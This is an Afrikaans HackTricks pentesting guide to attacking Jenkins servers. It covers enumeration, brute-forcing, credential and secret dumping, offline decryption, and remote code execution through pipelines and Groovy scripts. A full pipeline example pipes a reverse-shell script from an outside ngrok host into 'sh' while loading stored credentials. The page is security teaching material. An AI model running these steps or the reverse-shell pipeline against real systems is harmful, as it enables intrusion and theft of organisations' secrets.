# Jenkins Sekuriteit

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

Jenkins is 'n hulpmiddel wat 'n eenvoudige metode bied om 'n **deurlopende integrasie** of **deurlopende aflewering** (CI/CD) omgewing vir byna **enige** kombinasie van **programmeringstale** en bronkode-bewaarplekke met behulp van pyplyne te vestig. Verder outomatiseer dit verskeie roetine ontwikkelings take. Terwyl Jenkins nie die **behoefte om skrifte vir individuele stappe te skep** uitskakel nie, bied dit 'n vinniger en meer robuuste manier om die hele reeks bou, toets, en ontplooiing gereedskap te integreer as wat mens maklik handmatig kan konstrueer.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Onauthentiseerde Enumerasie

Om na interessante Jenkins bladsye sonder verifikasie te soek soos (_/people_ of _/asynchPeople_, wat die huidige gebruikers lys) kan jy gebruik:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Kyk of jy opdragte kan uitvoer sonder om verifikasie te benodig:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sonder geloofsbriewe kan jy binne _**/asynchPeople/**_ pad of _**/securityRealm/user/admin/search/index?q=**_ kyk vir **gebruikersname**.

Jy mag dalk die Jenkins-weergawe kry van die pad _**/oops**_ of _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Bekende Kwesbaarhede

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Aanmelding

In die basiese inligting kan jy **al die maniere om binne Jenkins aan te meld** nagaan:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registrasie

Jy sal Jenkins-instansies kan vind wat **jou toelaat om 'n rekening te skep en binne dit aan te meld. So eenvoudig soos dit.**

### **SSO Aanmelding**

Ook as **SSO** **funksionaliteit**/**plugins** teenwoordig was, moet jy probeer om **aan te meld** by die toepassing met 'n toetsrekening (bv. 'n toets **Github/Bitbucket rekening**). Wenke van [**hier**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** het nie **wagwoordbeleid** en **gebruikersnaam brute-force mitigasie** nie. Dit is noodsaaklik om **brute-force** op gebruikers toe te pas aangesien **swak wagwoorde** of **gebruikersname as wagwoorde** dalk in gebruik is, selfs **omgekeerde gebruikersname as wagwoorde**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Gebruik [hierdie python-skrip](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) of [hierdie powershell-skrip](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Baie organisasies kombineer **SaaS-gebaseerde bronbeheerbestuur (SCM) stelsels** soos GitHub of GitLab met 'n **interne, self-gasheer CI** oplossing soos Jenkins of TeamCity. Hierdie opstelling laat CI-stelsels toe om **webhook-gebeurtenisse van SaaS bronbeheer verskaffers te ontvang**, hoofsaaklik om pyplyn take te aktiveer.

Om dit te bereik, **whitelist** organisasies die **IP-reekse** van die **SCM-platforms**, wat hulle toelaat om toegang tot die **interne CI-stelsel** via **webhooks** te verkry. Dit is egter belangrik om daarop te let dat **enigiemand** 'n **rekening** op GitHub of GitLab kan skep en dit kan konfigureer om 'n **webhook te aktiveer**, wat moontlik versoeke na die **interne CI-stelsel** kan stuur.

Kyk: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Interne Jenkins Misbruik

In hierdie scenario's gaan ons veronderstel jy het 'n geldige rekening om toegang tot Jenkins te verkry.

{% hint style="warning" %}
Afhangende van die **Magtigings** meganisme wat in Jenkins gekonfigureer is en die toestemming van die gekompromitteerde gebruiker, **mag jy in staat wees of nie om die volgende aanvalle uit te voer nie.**
{% endhint %}

Vir meer inligting, kyk na die basiese inligting:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Lys van gebruikers

As jy toegang tot Jenkins het, kan jy ander geregistreerde gebruikers lys by [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds om cleartext geheime te vind

Gebruik [hierdie skrip](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) om build console outputs en build omgewingsveranderlikes te dump om hopelik cleartext geheime te vind.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Steel SSH Geloofsbriewe**

As die gekompromitteerde gebruiker **genoeg voorregte het om 'n nuwe Jenkins-node te skep/wysig** en SSH-geloofsbriewe reeds gestoor is om toegang tot ander nodes te verkry, kan hy **daardie geloofsbriewe steel** deur 'n node te skep/wysig en **'n gasheer in te stel wat die geloofsbriewe sal opneem** sonder om die gasheersleutel te verifieer:

![](<../../.gitbook/assets/image (218).png>)

Jy sal gewoonlik Jenkins ssh-geloofsbriewe in 'n **globale verskaffer** (`/credentials/`) vind, so jy kan dit ook aflaai soos jy enige ander geheim sou aflaai. Meer inligting in die [**Dumping secrets section**](./#dumping-secrets).

### **RCE in Jenkins**

Om 'n **dop in die Jenkins-bediener** te kry, gee die aanvaller die geleentheid om al die **geheime** en **omgewingsveranderlikes** te lek en om **ander masjiene te ontgin** wat in dieselfde netwerk gele√´ is of selfs **wolk-geloofsbriewe te versamel**.

Jenkins sal standaard **as SYSTEM** loop. Dus, om dit te kompromitteer, sal die aanvaller **SYSTEM-voorregte** gee.

### **RCE Skep/Wysig 'n projek**

Om 'n projek te skep/wysig is 'n manier om RCE oor die Jenkins-bediener te verkry:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Voer Groovy-skrip uit**

Jy kan ook RCE verkry deur 'n Groovy-skrip uit te voer, wat dalk stiller is as om 'n nuwe projek te skep:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Skep/Wysig Pyplyn

Jy kan ook **RCE kry deur 'n pyplyn te skep/wysig**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pyplyn Ontginning

Om pyplyne te ontgin, moet jy steeds toegang tot Jenkins h√™.

### Bou Pyplyne

**Pyplyne** kan ook gebruik word as **boumeganisme in projekte**, in daardie geval kan dit 'n **l√™er binne die bewaarplek** wees wat die pyplynsintaks bevat. Standaard word `/Jenkinsfile` gebruik:

![](<../../.gitbook/assets/image (127).png>)

Dit is ook moontlik om **pyplynkonfigurasiel√™ers op ander plekke te stoor** (byvoorbeeld in ander bewaarplekke) met die doel om **toegang tot die bewaarplek** en die pyplyn toegang te **skei**.

As 'n aanvaller **skryftoegang oor daardie l√™er** het, sal hy dit kan **wysig** en **potensieel die pyplyn kan aktiveer** sonder om selfs toegang tot Jenkins te h√™.\
Dit is moontlik dat die aanvaller **sommige takbeskermings moet omseil** (afhangende van die platform en die gebruiker se voorregte kan hulle omseil word of nie).

Die mees algemene snellers om 'n pasgemaakte pyplyn uit te voer, is:

* **Trekversoek** na die hoof tak (of potensieel na ander takke)
* **Stoot na die hoof tak** (of potensieel na ander takke)
* **Werk die hoof tak op** en wag totdat dit op een of ander manier uitgevoer word

{% hint style="info" %}
As jy 'n **eksterne gebruiker** is, moet jy nie verwag om 'n **PR na die hoof tak** van die repo van **ander gebruiker/organisasie** te skep en **die pyplyn te aktiveer** nie... maar as dit **sleg gekonfigureer** is, kan jy **maatskappye ten volle kompromitteer deur dit te ontgin**.
{% endhint %}

### Pyplyn RCE

In die vorige RCE-afdeling is reeds 'n tegniek aangedui om [**RCE te kry deur 'n pyplyn te wysig**](./#rce-creating-modifying-pipeline).

### Kontroleer Omgewingsveranderlikes

Dit is moontlik om **duidelike teks omgewingsveranderlikes** vir die hele pyplyn of vir spesifieke stadiums te verklaar. Hierdie omgewingsveranderlikes **moet nie sensitiewe inligting bevat nie**, maar 'n aanvaller kan altyd **al die pyplynkonfigurasies/Jenkinsfiles nagaan**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Vir inligting oor hoe geheime gewoonlik deur Jenkins hanteer word, kyk na die basiese inligting:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Geloofsbriewe kan **geskik word aan globale verskaffers** (`/credentials/`) of aan **spesifieke projekte** (`/job/<project-name>/configure`). Daarom, om al die geloofsbriewe te eksfiltreer, moet jy **ten minste al die projekte kompromitteer** wat geheime bevat en aangepaste/vergiftigde pypleidings uitvoer.

Daar is nog 'n probleem, om 'n **geheim binne die omgewing** van 'n pypleiding te kry, moet jy **die naam en tipe van die geheim ken**. Byvoorbeeld, as jy probeer om 'n **`usernamePassword`** **geheim** as 'n **`string`** **geheim** te laai, sal jy hierdie **fout** kry:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Hier is die manier om sommige algemene geheime tipes te laai:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Aan die einde van hierdie bladsy kan jy **al die geloofsbrieftipes vind**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Die beste manier om **al die geheime tegelyk te stort** is deur die **Jenkins** masjien te **kompromitteer** (byvoorbeeld 'n omgekeerde dop op die **ingeboude node** te laat loop) en dan die **meestersleutels** en die **ge√´nkripteerde geheime** te **lek** en dit vanlyn te dekripteer.\
Meer oor hoe om dit te doen in die [Nodes & Agents afdeling](./#nodes-and-agents) en in die [Post Exploitation afdeling](./#post-exploitation).
{% endhint %}

### Snellers

Van [die dokumentasie](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): Die `triggers` direktief definieer die **geoutomatiseerde maniere waarop die Pyplyn her-sneller moet word**. Vir Pypleidings wat ge√Øntegreer is met 'n bron soos GitHub of BitBucket, mag `triggers` nie nodig wees nie aangesien webhooks-gebaseerde integrasie waarskynlik reeds teenwoordig sal wees. Die snellers wat tans beskikbaar is, is `cron`, `pollSCM` en `upstream`.

Cron voorbeeld:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **ander voorbeelde in die dokumentasie**.

### Nodes & Agents

'n **Jenkins-instansie** mag **verskillende agents h√™ wat op verskillende masjiene loop**. Vanuit 'n aanvaller se perspektief beteken toegang tot verskillende masjiene **verskillende potensi√´le wolkbewyse** om te steel of **verskillende netwerktoegang** wat misbruik kan word om ander masjiene uit te buit.

Vir meer inligting, kyk na die basiese inligting:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Jy kan die **gekonfigureerde nodes** in `/computer/` lys, jy sal gewoonlik die **`Built-In Node`** (wat die node is wat Jenkins loop) en moontlik meer vind:

![](<../../.gitbook/assets/image (249).png>)

Dit is **spesiaal interessant om die Built-In node te kompromitteer** omdat dit sensitiewe Jenkins-inligting bevat.

Om aan te dui dat jy die **pipeline** in die **built-in Jenkins node** wil **loop**, kan jy die volgende konfigurasie binne die pipeline spesifiseer:
```bash
pipeline {
agent {label 'built-in'}
```
### Volledige voorbeeld

Pyplyn in 'n spesifieke agent, met 'n cron sneller, met pyplyn en stadium omgewingsveranderlikes, laai 2 veranderlikes in 'n stap en stuur 'n omgekeerde dop:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

Jy kan die geheime lys deur toegang te verkry tot `/credentials/` as jy genoeg regte het. Let daarop dat dit slegs die geheime in die `credentials.xml`-l√™er sal lys, maar **boukonfigurasiel√™ers** mag ook **meer geloofsbriewe** bevat.

As jy die **konfigurasie van elke projek kan sien**, kan jy ook daar die **name van die geloofsbriewe (geheime)** sien wat gebruik word om toegang tot die bewaarplek te verkry en **ander geloofsbriewe van die projek**.

![](<../../.gitbook/assets/image (180).png>)

#### Van Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Van skyf

Hierdie l√™ers is nodig om **Jenkins geheime te ontsluit**:

* secrets/master.key
* secrets/hudson.util.Secret

Sulke **geheime kan gewoonlik gevind word in**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Hier is 'n regex om hulle te vind:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Dekripsie van Jenkins-geheime vanlyn

As jy die **nodige wagwoorde om die geheime te dekripteer** gekry het, gebruik [**hierdie skrip**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **om daardie geheime te dekripteer**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Dekripteer Jenkins geheime vanaf Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Skep nuwe admin gebruiker

1. Toegang die Jenkins config.xml-l√™er in `/var/lib/jenkins/config.xml` of `C:\Program Files (x86)\Jenkis\`
2. Soek vir die woord `<useSecurity>true</useSecurity>` en verander die woord \*\*`true` \*\* na **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Herbegin** die **Jenkins** bediener: `service jenkins restart`
4. Gaan nou weer na die Jenkins-portaal en **Jenkins sal nie enige geloofsbriewe vra** hierdie keer nie. Jy navigeer na "**Manage Jenkins**" om die **administrateur wagwoord weer in te stel**.
5. **Aktiveer** die **sekuriteit** weer deur die instellings te verander na `<useSecurity>true</useSecurity>` en **herbegin die Jenkins weer**.

## Verwysings

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
